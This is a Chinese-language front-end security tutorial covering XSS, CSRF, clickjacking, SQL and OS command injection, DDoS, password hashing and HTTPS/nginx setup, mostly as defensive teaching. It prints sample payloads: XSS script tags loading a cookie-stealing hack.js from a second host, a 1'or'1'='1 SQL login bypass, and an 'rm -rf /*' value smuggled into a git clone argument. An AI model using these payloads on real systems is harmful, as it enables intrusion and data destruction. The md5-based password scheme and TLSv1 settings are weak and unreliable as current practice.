---
title: 前端安全
order: 100
layout: false
hideInMenu: true
---

# 一.常见web攻击
- XSS
- CSRF
- 点击劫持
- SQL注入
- OS注入
- 请求劫持
- DDOS

## 1.XSS（Cross Site Scripting）
>跨站脚本攻击
>XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻击是指通过
>存在安全漏洞的Web网站注册用户的浏览器内运行非法的非本站点HTML标签或JavaScript进行的一种攻击。
>跨站脚本攻击有可能造成以下影响:
> - 利用虚假输入表单骗取用户个人信息。
> - 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
> - 显示伪造的文章或图片。

> XSS攻击分类
- 反射型 - url参数直接注入

```
// 普通 
http://localhost:3000/?from=china  

// alert尝试 
http://localhost:3000/?from=<script>alert(3)</script> 

// 获取Cookie 
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script> // 短域名伪造 https://dwz.cn/  

// 伪造cookie入侵 chrome 
documentcookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxO DYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
```

- 存储型 - 存储到DB后读取时注入
```
// 评论 
<script>alert(1)</script> 

// 跨站脚本注入 
我来了<script src="http://localhost:4000/hack.js"></script>
```
### 1.1 XSS攻击的危害 - Scripting能干啥就能干啥
- 获取页面数据
- 获取Cookies
- 劫持前端逻辑
- 发送请求
- 偷取网站的任意数据
- 偷取用户的资料
- 偷取用户的秘密和登录态
- 欺骗用户

### 1.2防范手段
- ejs转义
``` 
<% code %>用于执行其中javascript代码；  
<%= code %>会对code进行html转义； 
<%- code %>将不会进行转义 
```

- HEAD

```
ctx.set('X-XSS-Protection', 0) // 禁止XSS过滤 目前谷歌浏览器已经删除此功能，safari浏览器目前还支持
// http://localhost:3000/?from=<script>alert(3)</script> 可以拦截 但伪装一下就不行了
```
> 0 禁止XSS过滤。
1 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部
分）。
1;mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。
1; report= (Chromium only)
启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri 指令的功能发送违规报告。

- CSP

> **内容安全策略** (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。 这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途。
CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

```
// 只允许加载本站资源 
Content-Security-Policy: default-src 'self' 
// 只允许加载 HTTPS 协议图片 
Content-Security-Policy: img-src https://* 
// 不允许加载任何来源框架 
Content-Security-Policy: child-src 'none'
```

```
ctx.set('Content-Security-Policy', "default-src 'self'") 
// 尝试一下外部资源不能加载 http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>
```

- 黑名单
> 用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义
```
  function escape(str) { 
    str = str.replace(/&/g, '&amp;') 
    str = str.replace(/</g, '&lt;') 
    str = str.replace(/>/g, '&gt;') 
    str = str.replace(/"/g, '&quto;') 
    str = str.replace(/'/g, '&#39;') 
    str = str.replace(/`/g, '&#96;') 
    str = str.replace(/\//g, '&#x2F;') 
    return str 
  }
```
> 富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。

- 白名单

```
  const xss = require('xss') 
  let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>') 
  // -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt; 
  console.log(html)
```

- HttpOnly Cookie
> 这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应 用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。

```
response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
```

## 2.CSRF(Cross Site Request Forgery)
> CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。

- 用户已经登录了站点 A，并在本地记录了 cookie
- 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B(B 站点要求访问站点A)。
- 站点 A 没有做任何 CSRF 防御

```
登录 http://localhost:4000/csrf.html
```


### 2.1CSRF攻击危害
- 利用用户登录态
- 用户不知情
- 完成业务请求
- 盗取用户资金（转账，消费）
- 冒充用户发帖背锅
- 损害网站声誉

### 2.2防御

- CSRF有两个特点：

  - CSRF通常发生在第三方域名。
  - CSRF攻击者不能获取到Cookie等信息，只是使用。

- 针对这两点，我可以专门制定防护策略，如下：
  - 阻止不明外域的访问
    - 同源检测
    - Samesite Cookie

  - 提交时要求附加本域才能获取的信息
    - CSRF Token
    - 双重Cookie验证

- Referer Check - Https不发送referer
```
  app.use(async (ctx, next) => { 
    await next() 
    const referer = ctx.request.header.referer 
    console.log('Referer:', referer) 
  })
```
- 验证码 人机图形验证码 + 短信

## 3.点击劫持 - clickjacking

> 点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。

```
// 登录 
http://localhost:4000/clickjacking.html
```

### 3.1防御
- X-FRAME-OPTIONS
  ``X-FRAME-OPTIONS`` 是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头就是为了防御用 iframe 嵌套的点击劫持攻击。
  该响应头有三个值可选，分别是
  - DENY，表示页面不允许通过 iframe 的方式展示
  - SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示
  - ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示

```
  ctx.set('X-FRAME-OPTIONS', 'DENY')
```

- JS方式
```
<head> 
  <style id="click-jack"> 
    html { 
      display: none !important; 
    } 
  </style> 
</head> 
<body> 
  <script> 
    if (self == top) { 
      var style = document.getElementById('click-jack') 
      document.body.removeChild(style) 
    } else { 
      top.location = self.location 
    } 
  </script> 
</body>
```
以上代码的作用就是当通过 iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。

## 4.SQL注入

```
// 填入特殊密码 
1'or'1'='1 
// 拼接后的SQL 
SELECT * 
FROM test.user 
WHERE username = 'laowang' 
AND password = '1'or'1'='1'
```

### 4.1防御
- 所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。

```
// 错误写法 
  const sql = ` 
    SELECT * 
    FROM test.user 
    WHERE username = '${ctx.request.body.username}' 
    AND password = '${ctx.request.body.password}' 
    `
    console.log('sql', sql) 
    res = await query(sql) 

  // 正确的写法 
  const sql = ` 
  SELECT * 
  FROM test.user 
  WHERE username = ? 
  AND password = ? 
  `
  console.log('sql', sql, ) 
  res = await query(sql,[ctx.request.body.username, ctx.request.body.password])
```

- 严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害
- 后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。
- 对进入数据库的特殊字符``（'，"，\，<，>，&，*，; 等）``进行转义处理，或编码转换**。基本上所有后端语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库。

## 5.OS命令注入
> OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库的，而OS命令注入是针对操作系统的。OS命令注入攻击指 通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险。倘 若调用Shell时存在疏漏，就可以执行插入的非法命令。

```
  // 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo 
  const exec = require('mz/child_process').exec; 
  let params = {/* 用户输入的参数 */}; 
  exec(`git clone ${params.repo} /some/path`);
```

如果传入的参数是会怎样
```
  https://github.com/xx/xx.git && rm -rf /* &&
```


## 6.请求劫持
- DNS劫持
顾名思义，DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip
- HTTP劫持 
运营商劫持，此时大概只能升级HTTPS了

## 7.DDOS(distributed denial of service)

> http://www.ruanyifeng.com/blog/2018/06/ddos.html 阮一峰

DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。

### 7.1常见攻击方式
- SYN Flood
> 此攻击通过向目标发送具有欺骗性源IP地址的大量TCP“初始连接请求”SYN数据包来利用TCP握手。目标机器响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程中的目标资源。
- HTTP Flood
> 此攻击类似于同时在多个不同计算机上反复按Web浏览器中的刷新 - 大量HTTP请求泛滥服务器，导致拒绝服务。

### 7.2防御手段
 - 备份网站 
 备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公告，告诉用户，网 站出了问题，正在全力抢修。 
 - HTTP 请求的拦截 高防IP -靠谱的运营商 多个 Docker 硬件 服务器 防火墙 
 - 带宽扩容 + CDN 提高犯罪成本

## 二. 防御手段
### 1.密码安全
- 泄露渠道
  - 数据库被偷
  - 服务器被入侵
  - 通讯被窃听
  - 内部人员泄露
- 其他网站（撞库）
- 防御
  - 严禁明文存储
  - 单向变换
  - 变换复杂度要求
  - 密码复杂度要求
  - 加盐（防拆解）
- 哈希算法
  - 明文 - 密文 - 一一对应
  - 雪崩效应 - 明文小幅变化 密文剧烈变化
  - 密文 -明文无法反推
  - 密文固定长度 md5 sha1 sha256
- 密码传输安全
  - https传输
  - 频次限制
  - 前端加密意义有限 - 传输层加密 不会泄露 但不代表不能登录
- 摘要加密的复杂度
  - md5反查 https://www.cmd5.com/

```
  // /app/password.js 
  const crypto = require('crypto') 
  const hash = (type, str) => crypto.createHash(type).update(str).digest('hex')  
  const md5 = str => hash('md5',str) const sha1 = str => hash('sha1',str) 
  const encryptPassword = (salt, password) => md5(salt + 'abced@#4@%#$7' + password) 
  const psw = '123432！@#！@#@！#' 
  console.log('md5', md5(psw)) 
  console.log('sha1', sha1(psw)) 
  module.exports = encryptPassword
```

两种强化方式
```
  // index.js 
  const encryptPassword = require('./password') 
  if (res.length !== 0 && res[0].salt === null) { 
    console.log('no salt ..') 
    if (password === res[0].password) { 
      sql = ` 
      update test.user 
      set salt = ?, password = ?
      where username = ? 
      `
      const salt = Math.random() * 99999 + new Date().getTime() 
      res = await query(sql, [salt, encryptPassword(salt, password), username]) ctx.session.username = ctx.request.body.username 
      ctx.redirect('/?from=china')
      } 
    } else { 
      console.log('has salt') 
      if (encryptPassword(res[0].salt, password) === res[0].password) { 
        ctx.session.username = ctx.request.body.username 
        ctx.redirect('/?from=china') 
    } 
  }
```

### 2. 人机验证 与 验证码
样式和反面教材 https://veui.net/
```
$('.verify-code font').text()
```
![](https://static.iyb.tm/web/doc/assets/images/network/01.jpg)

滑动验证码实现原理
- 1.服务端随机生成抠图和带有抠图阴影的背景图片，服务端保存随机抠图位置坐标；
- 2.前端实现滑动交互，将抠图拼在抠图阴影之上，获取到用户滑动距离值；
- 3.前端将用户滑动距离值传入服务端，服务端校验误差是否在容许范围内；

### 3. HTTPS 配置

> https 和密码学 https://www.cnblogs.com/hai-blog/p/8311671.html 浏览器如何验证SSL证书 http://wemedia.ifeng.com/70345206/wemedia.shtml

- HTTP的弱点
![](https://static.iyb.tm/web/doc/assets/images/network/02.jpg)

```
  #查看需要经过的节点 
  traceroute www.baidu.com
```

- 危害
  - 窃听
    - 密码 敏感信息
  - 篡改
    - 插入广告 重定向到其他网站(JS 和 Head头)

- 时代趋势
> - 目前全球互联网正在从HTTP向HTTPS的大迁移
> - Chrome和火狐浏览器将对不采用HTTPS 加密的网站提示不安全
> - 苹果要求所有APP通信都必须采用HTTPS加密
> - 小程序强制要求服务器端使用HTTPS请求

- 特点
  - 保密性 (防泄密)
  - 完整性（防篡改）
  - 真实性（防假冒）

HTTP + SSL = HTTPS

- 什么是SSL证书
SSL证书由浏览器中“受信任的根证书颁发机构”在验证服务器身份后颁发,具有网站身份验证和加密传输双重功能

### 密码学
#### 对称加密
![](https://static.iyb.tm/web/doc/assets/images/network/03.jpg)

> 对称加密的一大缺点是密钥的管理与分配，换句话说，如何把密钥发送到需要解密你的消息的人的手里是一个问题。在发送密钥的过程中，密钥有很大的风险会被黑客们拦截。现实中通常的做法是将对称加密的密钥进行非对称加密，然后传送给需要它的人。
> DES

#### 不对称加密
![](https://static.iyb.tm/web/doc/assets/images/network/04.jpg)
- 产生一对秘钥
- 公钥负责加密
- 私钥负责解密
- 私钥无法解开说明公钥无效 - 抗抵赖
- 计算复杂对性能有影响(极端情况下 1000倍)
常见算法 RSA（大质数）、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法）。

> RSA原理
> http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html

### SSH公钥登录原理
- 密码口令登录
  通过密码进行登录，主要流程为：
  1. 客户端连接上服务器之后，服务器把自己的公钥传给客户端
  2. 客户端输入服务器密码通过公钥加密之后传给服务器
  3. 服务器根据自己的私钥解密登录密码，如果正确那么就让客户端登录
- 公钥登录
  公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：
  1. 客户端生成RSA公钥和私钥
  2. 客户端将自己的公钥存放到服务器
  3. 客户端请求连接服务器，服务器将一个用公钥加密随机字符串发送给客户端
  4. 客户端根据自己的私钥加密这个随机字符串之后再发送给服务器
  5. 服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。

![](https://static.iyb.tm/web/doc/assets/images/network/09.jpg)

这样就不用使用密码了。
```
// 生成公钥 ssh-keygen -t rsa -P '' 

wangyi@wangyideMBP:~$ ssh-keygen 
Generating public/private rsa key pair. 
Enter file in which to save the key (/Users/wangyi/.ssh/id_rsa): 
/Users/wangyi/.ssh/id_rsa already exists. 
Overwrite (y/n)? yes 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /Users/wangyi/.ssh/id_rsa. 
Your public key has been saved in /Users/wangyi/.ssh/id_rsa.pub. 
The key fingerprint is: 
SHA256:IeFPfrcQ3hhP64SRTAFzGIHl2ROcopl5HotRi2XNOGk wangyi@wangyideMBP 
The key's randomart image is: 
+---[RSA 2048]----+ 
| .o*@=o | 
| ..oEB=o | 
| o@=+O . | 
| B=+o @ . | 
| =So* * | 
| . o. = . | 
| o | 
| | 
| | 
+----[SHA256]-----+ 

// 查看公钥 
cat .ssh/id_rsa.pub
```
```
// 将公钥拷贝到服务器 
scp ~/.ssh/id_rsa.pub root@47.98.252.XXX:/root 
// 将公钥加入信任列表 
cat id_dsa.pub >> ~/.ssh/authorized_keys
```
网站如何通过加密和用户安全通讯

![](https://static.iyb.tm/web/doc/assets/images/network/05.jpg)
![](https://static.iyb.tm/web/doc/assets/images/network/06.jpg)

根证书在哪里
> windows

> 在Windows下按Windows+ R, 输入certmgr.msc，在“受信任的根证书颁发机构”-“证书中”找到“ROOTCA”，截止日期2025/08/23，单击右键，属性，可以查看其属性“禁用此证书的所有目的”

![](https://static.iyb.tm/web/doc/assets/images/network/07.png)

> Mac

> 钥匙串

![](https://static.iyb.tm/web/doc/assets/images/network/08.png)
> http://www.techug.com/post/https-ssl-tls.html HTTPS加密原理介绍

### 配置过程
- 修改开发机的host 前置
  ```
    // 开发机的hosts文件 /etc/hosts 
    // 添加 
    127.0.0.1 www.josephxia.com
  ```
- 阿里云取得的真实证书 （域名 www.josephxia.com）
- docker模拟nginx环境

```
// 安全课程根目录 
version: '3.1' 
  services: 
    nginx: 
      restart: always 
      image: nginx 
      ports: 
      - 80:80 
      - 443:443 
    volumes: 
      - ./conf.d/:/etc/nginx/conf.d 
      - ./html/:/var/www/html/
```
- 原始的80端口服务
```
// conf.d/www.josephxia.com.conf 

server { 
  listen 80; 
  server_name www.josephxia.com; 
  location / { 
    root /var/www/html; 
    index index.html index.htm; 
    } 
  }
  // 增加的部分 
  server { 
    listen 443; 
    server_name localhost; 
    ssl on; 
    root html; 
    index index.html index.htm; 
    // 公钥 + 证书 
    ssl_certificate conf.d/cert/www.josephxia.com.pem; 
    // 私钥 
    ssl_certificate_key conf.d/cert/www.josephxia.com.key; 
    ssl_session_timeout 5m; 
    ssl_ciphers ECDHE-RSA-AES128-GCM- SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; 
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2; 
    ssl_prefer_server_ciphers on; 
    location / { 
      root /var/www/html; 
      index index.html index.htm; 
      } 
  }
```
- 增加http -> https强制跳转
```
// conf.d/www.josephxia.com.conf 
server { 
  listen 80; 
  server_name www.josephxia.com; 
  // location / { 
    // root /var/www/html; 
    // index index.html index.htm; 
    // } 

  location / { 
    rewrite ^(.*) https://www.josephxia.com/$1 permanent; 
    } 
  }
```
SSL证书分类
- 入门级 DVSSL - 域名有效 无门槛
- 企业型 OVSSL - 企业资质、个人认证
- 增强型EVSSL - 浏览器给予绿色地址栏显示公司名字

## 3.helmet中间件
> https://www.npmjs.com/package/koa-helmet
```
  // npm i koa-helmet -s 
  const Koa = require("koa"); 
  const helmet = require("koa-helmet"); 
  const app = new Koa(); app.use(helmet()); 
  app.use((ctx) => { 
    ctx.body = "Hello World" 
  }); 
  app.listen(4000);
```
- Strict-Transport-Security：强制使用安全连接（SSL/TLS之上的HTTPS）来连接到服务器。
- X-Frame-Options：提供对于“点击劫持”的保护。
- X-XSS-Protection：开启大多现代浏览器内建的对于跨站脚本攻击（XSS）的过滤功能。
- X-Content-Type-Options： 防止浏览器使用MIME-sniffing来确定响应的类型，转而使用明确的content-type来确定。
- Content-Security-Policy：防止受到跨站脚本攻击以及其他跨站注入攻击。

## 4.Session管理
对于cookie的安全使用，其重要性是不言而喻的。特别是对于动态的web应用，在如HTTP这样的无状态协议的之上，它们需要使用cookie来维持状态

- Cookie标示
  - secure - 这个属性告诉浏览器，仅在请求是通过HTTPS传输时，才传递cookie。
  - HttpOnly - 设置这个属性将禁止 javascript 脚本获取到这个cookie，这可以用来帮助防止跨站脚本攻击。
- Cookie域
  - domain - 这个属性用来比较请求URL中服务端的域名。如果域名匹配成功，或这是其子域名，则继续检查 path 属性。
  - path - 除了域名，cookie可用的URL路径也可以被指定。当域名和路径都匹配时，cookie才会随请求发送。
  - expires - 这个属性用来设置持久化的cookie，当设置了它之后，cookie在指定的时间到达之前都不会过期。

## 5.浏览器安全控制
- X-XSS-Protection
防止反射型XSS
- Strict-Transport-Security
强制使用HTTPS通信
- CSP

> https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy
> https://juejin.im/post/5c6ad29ff265da2da00ea459

HTTP 响应头 Content-Security-Policy 允许站点管理者在指定的页面控制用户代理的资源。除了少数例外，这条政策将 极大地指定服务源 以及脚本端点。这将帮助防止跨站脚本攻击（Cross-Site Script） (XSS).

```
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

安全防范的总结
https://www.tuicool.com/articles/7Ff2EbZ